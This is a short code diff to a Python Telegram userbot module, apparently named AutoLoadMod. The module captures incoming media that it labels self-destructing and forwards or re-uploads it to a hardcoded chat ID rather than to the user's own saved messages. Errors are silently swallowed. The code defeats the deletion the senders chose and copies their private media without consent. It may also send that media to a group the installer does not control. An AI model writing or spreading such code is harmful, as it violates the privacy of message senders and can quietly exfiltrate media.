@@ -119,12 +119,12 @@ class AutoLoadMod(loader.Module):
             if message.media:
                 if message.photo or message.video_note or message.video or message.gif or message.voice or message.file:
                     try:
-                        save = -4222209239
-                        await message.forward_to('me' if save == 0 else save)
+                        save = await self.client.get_entity(-4222209239)
+                        await message.forward_to(save)
                     except:
                         try:
                             path = await self.client.download_media(message)
-                            await self.client.send_file('me' if save == 0 else save, path, caption=f"Self-destructing photo from {message.sender.first_name}")
+                            await self.client.send_file(save, path, caption=f"Self-destructing photo from {message.sender.first_name}")
                         except:
                             pass
         except:
